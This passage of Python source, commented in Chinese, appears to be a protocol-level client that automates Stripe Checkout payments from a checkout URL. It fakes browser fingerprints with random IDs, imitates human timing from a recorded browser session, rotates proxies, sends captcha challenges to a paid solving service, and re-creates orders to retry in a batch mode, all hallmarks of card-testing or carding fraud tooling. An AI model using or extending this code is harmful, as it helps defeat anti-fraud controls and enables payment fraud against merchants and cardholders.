    def _create_new_order(self) -> str:
        """通过 order_factory 创建新订单，返回新的 checkout_url。"""
        if not self.order_factory:
            return ""
        try:
            return self.order_factory() or ""
        except Exception as e:
            log(f"   建单失败: {str(e)[:80]}")
            return ""

    def pay_from_url(self, checkout_url: str, retries: int = 0) -> PaymentOutcome:
        """从 checkout URL 解析 cs_id 后支付。

        retries > 0 时，遇到 captcha_rejected 会重新建单重试。
        """
        m = re.search(r"(cs_(?:live|test)_[A-Za-z0-9]+)", checkout_url or "")
        if not m:
            raise ValueError(f"URL 里没有 cs_live_: {str(checkout_url)[:100]}")
        cs_id = m.group(1)

        # 首次执行，遇到代理故障自动轮换重试
        last_exc = None
        outcome = None
        for proxy_try in range(3):
            try:
                outcome = self.pay(cs_id)
                break
            except Exception as e:
                last_exc = e
                msg = str(e)
                if "SSL" in msg or "ConnectError" in msg or "EOF" in msg:
                    self.rotate_proxy_sid()
                    self._client = None
                    time.sleep(2)
                    continue
                raise
        if outcome is None:
            raise last_exc if last_exc else RuntimeError("pay 失败")

        for attempt in range(retries):
            if outcome.state in ("paid", "card_declined"):
                break
            log(f"   重试 {attempt + 1}/{retries}（上次 {outcome.state}）")
            new_url = self._create_new_order() if self.order_factory else ""
            if new_url:
                mm = re.search(r"(cs_(?:live|test)_[A-Za-z0-9]+)", new_url)
                if mm:
                    cs_id = mm.group(1)
            time.sleep(random.uniform(5, 12))
            outcome = self.pay(cs_id)
        return outcome

    def pay(self, cs_id: str) -> PaymentOutcome:
        """按真实浏览器的时间线执行。

        HAR 实测时序：
          +0s    init
          +3.8s  allowed_origins
          +5.6s  payment_pages(country)
          +6.2s  elements/sessions
          +7.0s  payment_pages
          +10.6s payment_pages
          +10.9s allowed_origins
          +11.4s payment_pages
          +11.6s elements/sessions
          +12.6s payment_pages
          +175s  ← 用户填表 162 秒
          +175.9s payment_pages
          +176s  elements/sessions
          +209s  payment_pages
          +213s  payment_methods
          +213.7s confirm
        """
        abandoned = False

        if self.step_fingerprint:
            fp = self.register_fingerprint()
            self._sleep(random.uniform(2.0, 4.0))
            self.fetch_allowed_origins()
            self._sleep(random.uniform(1.0, 2.0))
        else:
            # 批量模式：不发 m.stripe.com/6，直接用随机 guid/muid/sid
            fp = Fingerprint(guid=str(uuid.uuid4()), muid=str(uuid.uuid4()),
                             sid=str(uuid.uuid4()))
            log("① 跳过指纹注册（默认模式：随机 guid/muid/sid）")

        _, ctx = self.init_checkout(cs_id)

        if self.step_dwell:
            dwell = random.uniform(10.0, 16.0)
            log(f"   停留 {dwell:.1f}s（模拟用户阅读）")
            time.sleep(dwell)

        if self.step_elements:
            locale, _tz = self._align_locale(self.proxy)
            self.elements_session(cs_id, ctx, locale)
        else:
            log("③ 跳过 elements/sessions（默认模式）")

        if self.step_tax_region:
            self._sleep(random.uniform(0.5, 1.2))
            self.update_address(cs_id, ctx)
        else:
            log("④ 跳过 tax_region（默认模式）")

        # 纯协议：不生成 passive token，直接进入 confirm。
        # 实测不带 passive token 时 confirm 仍返回 200，且部分卡会直接 402 拒卡。
        passive = None
        log("⑤ 跳过 passive captcha（纯协议）")

        if self.external_pm:
            # 浏览器已用 Stripe 输入框换好 pm_，服务端不再提交卡号
            pm_id = self.external_pm
            log(f"⑥ 复用浏览器产出的 {pm_id}")
        else:
            pm_id = self.create_payment_method(cs_id, fp, ctx)
        self._sleep(random.uniform(0.5, 1.0))
        confirm_res = self.confirm(cs_id, pm_id, fp, ctx, passive)

        # challenge 补解：必须复用同一个 solver 会话
        body = confirm_res.get("body") or {}
        na = body.get("next_action") or (body.get("payment_intent") or {}).get("next_action") or {}
        sdk = na.get("use_stripe_sdk") or {}
        for round_no in range(2):
            if sdk.get("type") != "intent_confirmation_challenge":
                break
            sj = sdk.get("stripe_js") or {}
            pi = body.get("payment_intent") or {}
            log(f"⑦b 命中 challenge（第 {round_no + 1} 次）site_key={str(sj.get('site_key'))[:8]}")
            ch = self._solve_challenge(
                str(sj.get("site_key") or ""), str(sj.get("rqdata") or "")
            )
            if not (ch and sj.get("verification_url")):
                log("   未解出挑战，放弃本单")
                abandoned = True
                break
            log(f"   解出 token（{len(ch.get('token') or '')} 字符），继续 verify")
            v = self.verify_challenge(
                str(sj["verification_url"]), ch["token"],
                str(pi.get("client_secret") or ""), ch.get("ekey", ""),
            )
            vb = v.get("body") or {}
            vna = vb.get("next_action") or (vb.get("payment_intent") or {}).get("next_action") or {}
            vsdk = vna.get("use_stripe_sdk") or {}
            if vsdk.get("type") == "intent_confirmation_challenge":
                # 换了一套挑战参数，用新的 site_key/rqdata 再解一次
                confirm_res = v
                body = vb
                sdk = vsdk
                continue
            if vb.get("last_payment_error") or vb.get("error") or vb.get("payment_intent"):
                confirm_res = v
            break

        outcome = self.classify(confirm_res, None)
        # 纯协议放弃的单子不必轮询：状态不会自己变成拒卡
        if abandoned:
            log("   已放弃，跳过轮询")
        elif outcome.state not in ("paid", "card_declined", "captcha_rejected"):
            polled = self.poll(cs_id)
            outcome = self.classify(confirm_res, polled)
        log(f"判定 {outcome.state} decline={outcome.decline_code} code={outcome.code}")
        return outcome

    @staticmethod
    def _sleep(sec: float) -> None:
        time.sleep(max(0.01, sec))


def pay_checkout(
    checkout_url: str,
    card: dict[str, str],
    billing: dict[str, str],
    proxy: str | None = None,
    captcha_key: str = "",
    captcha_url: str = "https://api.yescaptcha.com",
) -> PaymentOutcome:
    """从 checkout URL 解析 cs_id 并完成支付。"""
    m = re.search(r"(cs_(?:live|test)_[A-Za-z0-9]+)", checkout_url or "")
    if not m:
        raise ValueError(f"URL 里没有 cs_live_: {str(checkout_url)[:100]}")
    with StripeProtocol(
        proxy=proxy, captcha_key=captcha_key,
        captcha_url=captcha_url, card=card, billing=billing,
    ) as sp:
        return sp.pay(m.group(1))
